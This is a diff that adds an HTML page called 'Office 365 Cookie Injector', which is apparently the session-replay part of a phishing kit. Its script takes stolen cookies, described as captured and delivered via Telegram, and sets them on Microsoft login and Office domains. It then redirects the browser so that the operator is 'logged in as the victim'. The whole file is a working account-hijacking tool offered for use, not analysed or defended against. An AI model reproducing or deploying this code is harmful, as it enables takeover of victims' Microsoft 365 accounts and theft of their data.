@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>🍪 Office 365 Cookie Injector</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0f;
+            color: #fff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: #121218;
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            padding: 30px;
+        }
+        h1 { color: #ff6b00; margin-bottom: 10px; }
+        .subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
+        textarea {
+            width: 100%;
+            height: 200px;
+            background: #0a0a0a;
+            color: #00ff88;
+            border: 1px solid #1a1a1a;
+            border-radius: 8px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 12px;
+            resize: vertical;
+        }
+        textarea:focus { border-color: #ff6b00; outline: none; }
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            flex: 1;
+            min-width: 100px;
+            text-align: center;
+        }
+        .btn:hover { transform: scale(1.02); }
+        .btn.primary { background: #ff6b00; color: #000; }
+        .btn.danger { background: #ff0040; color: #fff; }
+        .btn.success { background: #00ff88; color: #000; }
+        .btn.secondary { background: #1a1a1a; color: #fff; border: 1px solid #333; }
+        #status {
+            padding: 12px;
+            border-radius: 8px;
+            margin: 10px 0;
+            display: none;
+        }
+        #status.success { background: #0a1a0a; border: 1px solid #00ff88; color: #00ff88; display: block; }
+        #status.error { background: #1a0a0a; border: 1px solid #ff0040; color: #ff0040; display: block; }
+        .step {
+            background: #0a0a0a;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 6px 0;
+            border-left: 3px solid #ff6b00;
+            font-size: 13px;
+        }
+        .step .num { color: #ff6b00; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>🍪 Office 365 Cookie Injector</h1>
+    <p class="subtitle">Paste captured cookies here to hijack the victim's session</p>
+
+    <div id="status"></div>
+
+    <textarea id="cookieInput" placeholder='Paste your captured cookies here...'></textarea>
+
+    <div class="btn-group">
+        <button class="btn primary" onclick="injectCookies()">💉 Inject Cookies</button>
+        <button class="btn danger" onclick="clearCookies()">🗑️ Clear All</button>
+        <button class="btn secondary" onclick="goToMicrosoft()">🔗 Go to Microsoft</button>
+    </div>
+
+    <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #1a1a1a;">
+        <h3 style="color: #888; font-size: 13px; margin-bottom: 10px;">📋 Usage Steps</h3>
+        <div class="step"><span class="num">Step 1:</span> Get captured cookies from Telegram</div>
+        <div class="step"><span class="num">Step 2:</span> Paste the JSON data above</div>
+        <div class="step"><span class="num">Step 3:</span> Click "Inject Cookies"</div>
+        <div class="step"><span class="num">Step 4:</span> Go to login.microsoftonline.com</div>
+        <div class="step"><span class="num">Step 5:</span> ✅ You're logged in as the victim!</div>
+    </div>
+</div>
+
+<script>
+function showStatus(message, type = 'info') {
+    const status = document.getElementById('status');
+    status.textContent = message;
+    status.className = type;
+    status.style.display = 'block';
+}
+
+function injectCookies() {
+    const input = document.getElementById('cookieInput').value.trim();
+    if (!input) {
+        showStatus('❌ Error: Please paste cookies first!', 'error');
+        return;
+    }
+    
+    try {
+        const cookies = JSON.parse(input);
+        let count = 0;
+        const domains = ['.login.microsoftonline.com', '.microsoft.com', '.office.com'];
+        
+        for (const [name, value] of Object.entries(cookies)) {
+            if (name && value) {
+                for (const domain of domains) {
+                    document.cookie = `${name}=${value}; path=/; domain=${domain}; Secure; SameSite=None; Max-Age=31536000`;
+                }
+                document.cookie = `${name}=${value}; path=/; Secure; SameSite=None; Max-Age=31536000`;
+                count++;
+            }
+        }
+        
+        showStatus(`✅ Successfully injected ${count} cookies!`, 'success');
+        setTimeout(() => {
+            if (confirm('✅ Cookies injected! Go to Microsoft 365 now?')) {
+                window.location.href = 'https://login.microsoftonline.com';
+            }
+        }, 1000);
+        
+    } catch (error) {
+        showStatus(`❌ Error: ${error.message}`, 'error');
+    }
+}
+
+function clearCookies() {
+    if (!confirm('⚠️ This will clear ALL cookies. Continue?')) return;
+    const cookies = document.cookie.split(';');
+    let count = 0;
+    for (const cookie of cookies) {
+        const [name] = cookie.trim().split('=');
+        if (name) {
+            document.cookie = `${name}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/`;
+            count++;
+        }
+    }
+    showStatus(`🗑️ Cleared ${count} cookies`, 'info');
+}
+
+function goToMicrosoft() {
+    window.open('https://login.microsoftonline.com', '_blank');
+}
+</script>
+
+</body>
+</html>
